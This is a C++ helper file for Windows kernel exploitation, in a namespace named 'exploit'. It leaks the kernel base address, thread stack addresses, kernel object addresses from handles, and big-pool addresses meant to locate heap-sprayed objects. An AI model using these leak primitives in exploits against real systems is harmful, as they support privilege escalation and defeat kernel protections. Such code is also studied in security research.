#include "include/common/memtools.hpp"

namespace exploit
{
    namespace memtools
    {
        unsigned long long ulGetKernelBase(const PCHAR ModuleName) {
            PVOID kernelImageBase = NULL;
            PCHAR kernelImage = NULL;


            //import function `NtQuerySystemInformation`
            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
            PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
            if (NtQuerySystemInformation == NULL) {
                printf("[!] GetProcAddress() failed.\n");
                return 0;
            }

            //init length
            ULONG len = 0;
            NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
            //init module infomations
            PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
            if (pModuleInfo == NULL) {
                printf("[!] [ulGetKernelBase]  Could not allocate memory for module info.\n");
                return 0;
            }

            //starting quering
            NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

            if (status != (NTSTATUS)0x0) {
                printf("[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\n", status);
                return 0;
            }
            for (unsigned int i = 0; i < pModuleInfo->ModulesCount; i++) {
                kernelImage = (PCHAR)pModuleInfo->Modules[i].Name;
                if (strstr(kernelImage, ModuleName)) {
                    kernelImageBase = pModuleInfo->Modules[i].ImageBaseAddress;
                    printf("[*] [ulGetKernelBase]  Mod name %s ", kernelImage);
                    printf(" Base Addr 0x%llx\r\n", kernelImageBase);

                    return (unsigned long long)kernelImageBase;
                }
            }
            return 0;
        }

        unsigned long long ulGetStackLimit(LPCWSTR ProcessName) {
            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
            PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
            if (query == NULL) {
                printf("GetProcAddress() failed.\n");
                return 1;
            }
            ULONG len = 2000;
            NTSTATUS status = NULL;
            PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
            do {
                len *= 2;
                pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
                status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
            } while (status == (NTSTATUS)0xc0000004);
            if (status != (NTSTATUS)0x0) {
                printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
                return 1;
            }

            while (pProcessInfo->NextEntryOffset != NULL) {
                if (pProcessInfo->ImageName.Buffer) {
                    if (wcsstr(pProcessInfo->ImageName.Buffer, ProcessName)) {
                        for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
                            PVOID stackBase = pProcessInfo->Threads[i].StackBase;
                            PVOID stackLimit = pProcessInfo->Threads[i].StackLimit;
                            printf("Stack base 0x%llx\t", stackBase);
                            printf("Stack limit 0x%llx\r\n", stackLimit);

                        }
                        break;
                    }
                }
                pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
            }
            return 0;
        }

        unsigned long long ulGetStackLimitWithInfo(pStackInfo stackinfo) {
            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
            PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
            if (query == NULL) {
                printf("GetProcAddress() failed.\n");
                return 1;
            }
            ULONG len = 2000;
            NTSTATUS status = NULL;
            PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
            do {
                len *= 2;
                pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
                status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
            } while (status == (NTSTATUS)0xc0000004);
            if (status != (NTSTATUS)0x0) {
                printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
                return 1;
            }

            while (pProcessInfo->NextEntryOffset != NULL) {
                if (pProcessInfo->ImageName.Buffer) {
                    if (wcsstr(pProcessInfo->ImageName.Buffer, stackinfo->ModuleName)) {
                        for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
                            PVOID stackBase = pProcessInfo->Threads[i].StackBase;
                            PVOID stackLimit = pProcessInfo->Threads[i].StackLimit;
                            stackinfo->result = (unsigned long long)stackBase;
                            printf("Stack base 0x%llx\t", stackBase);
                            printf("Stack limit 0x%llx\r\n", stackLimit);
                            break;
                        }
                    }
                }
                pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
            }
            return 0;
        }

        unsigned long long ulUseStackInfo(wchar_t ProcName[]) {
            pStackInfo stackinfo = (pStackInfo)malloc(sizeof(StackInfo));
            if (stackinfo == NULL) {
                printf("[!] Can't allocate memory\n");
                return 0;
            }
            stackinfo->ModuleName = ProcName;
            stackinfo->result = 0;
            HANDLE hThread = CreateThread(NULL, 0x100, (LPTHREAD_START_ROUTINE)ulGetStackLimitWithInfo, stackinfo, NULL, NULL);
            if (hThread == NULL) {
                printf("[!] Can't get thread\n");
                return 0;
            }
            system("pause");
            WaitForSingleObject(hThread, INFINITE);
            unsigned long long baseaddr = stackinfo->result;
            CloseHandle(hThread);
            free(stackinfo);
            return baseaddr;
        }

        bool bFindHandleObject(DWORD targetPid, ULONG_PTR targetHandle, ULONG_PTR result) {
            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
            PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
            if (!NtQuerySystemInformation)
            {
                std::cout << "[-] Failed to get NtQuerySystemInformation\n";
                return false;
            }

            ULONG bufferSize = 0x10000;
            std::vector<BYTE> buffer(bufferSize);

            NTSTATUS status;
            ULONG returnLength = 0;

            while (true)
            {
                status = NtQuerySystemInformation(
                    (SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation,
                    buffer.data(),
                    bufferSize,
                    &returnLength
                );

                if (status == STATUS_INFO_LENGTH_MISMATCH)
                {
                    bufferSize *= 2;
                    buffer.resize(bufferSize);
                    continue;
                }

                break;
            }

            if (!NT_SUCCESS(status))
            {
                std::cout << "[-] NtQuerySystemInformation failed: "
                    << std::hex << status << std::endl;
                return false;
            }

            auto handleInfo =
                (PSYSTEM_HANDLE_INFORMATION_EX)buffer.data();

            for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++)
            {
                auto& entry = handleInfo->Handles[i];

                if ((DWORD)entry.UniqueProcessId != targetPid)
                    continue;

                if (entry.HandleValue != targetHandle)
                    continue;
                *reinterpret_cast<DWORD64*>(result) = reinterpret_cast<DWORD64>(entry.Object);
                return true;
            }

            std::cout << "[-] Handle not found\n";
            return false;
        }

        unsigned long long ulFindKernelPoolAddress(ULONG targetTag, SIZE_T targetSize, PUINT64 outAddresses, ULONG maxCount) {
            ULONG retlen = 0;
            ULONG foundCount = 0;
            NTSTATUS status;

            //import function `NtQuerySystemInformation`
            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
            PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
            if (NtQuerySystemInformation == NULL) {
                printf("[!] GetProcAddress() failed.\n");
                return 0;
            }

            // 1. 初始分配 4KB 试探大小
            ULONG bufferSize = 0x1000;
            PVOID buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buffer) return 0;

            // 2. 循环获取足够大的缓冲区
            while (1) {
                status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, buffer, bufferSize, &retlen);

                if (status == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
                    VirtualFree(buffer, 0, MEM_RELEASE);
                    bufferSize = retlen + 0x1000; // 多分配一点防止竞态
                    buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if (!buffer) return 0;
                }
                else if (NT_SUCCESS(status)) {
                    break; // 获取成功
                }
                else {
                    VirtualFree(buffer, 0, MEM_RELEASE);
                    return 0; // 其他错误
                }
            }

            // 3. 解析数据
            PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)buffer;

            // 倒序遍历（从最新分配的向最早分配找，堆喷射等场景下目标对象通常是最近分配的）
            for (int i = pBigPoolInfo->Count - 1; i >= 0; --i) {
                PSYSTEM_BIGPOOL_ENTRY entry = &pBigPoolInfo->AllocatedInfo[i];

                // 判断 Size 是否匹配（如果 targetSize 不为 0）
                if (targetSize != 0 && entry->SizeInBytes != targetSize) {
                    continue;
                }

                // 判断 Tag 是否匹配
                if (entry->TagUlong != targetTag) {
                    continue;
                }

                // 获取地址，并清除最低位的 NonPaged 标志 (Bit 0)
                UINT64 realAddress = (UINT64)entry->VirtualAddress & 0xFFFFFFFFFFFFFFFE;

                // 保存结果
                if (foundCount < maxCount && outAddresses) {
                    outAddresses[foundCount] = realAddress;
                }
                foundCount++;
            }

            VirtualFree(buffer, 0, MEM_RELEASE);
            return foundCount;
        }

        void hexdump(const void* data, ULONG size)
        {
            const unsigned char* p = (const unsigned char*)data;
            ULONG i, j;

            for (i = 0; i < size; i += 16)
            {
                // 偏移
                printf("%08zx  ", i);

                // hex 区
                for (j = 0; j < 16; j++)
                {
                    if (i + j < size)
                        printf("%02X ", p[i + j]);
                    else
                        printf("   ");

                    if (j == 7) printf(" "); // 中间分隔
                }

                printf(" ");

                // ASCII 区
                for (j = 0; j < 16 && i + j < size; j++)
                {
                    unsigned char c = p[i + j];
                    printf("%c", isprint(c) ? c : '.');
                }

                printf("\n");
            }
        }

    } // namespace memtools

} // namespace exploit